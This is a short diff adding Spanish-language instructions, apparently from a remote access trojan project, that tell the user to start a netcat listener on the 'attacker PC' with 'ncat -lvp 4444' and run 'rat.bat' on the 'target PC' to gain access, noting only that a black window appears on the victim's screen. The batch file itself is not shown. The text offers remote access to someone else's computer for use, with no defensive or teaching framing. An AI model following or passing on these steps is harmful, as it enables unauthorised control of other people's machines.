@@ -1,0 +1,4 @@
+iniciar netcat en el pc atacante con el comando: ncat -lvp 4444
+
+ejecutar rat.bat en el pc objetivo
+y listo, ya tienes acceso pero se ve una ventana negra en el pc objetivo
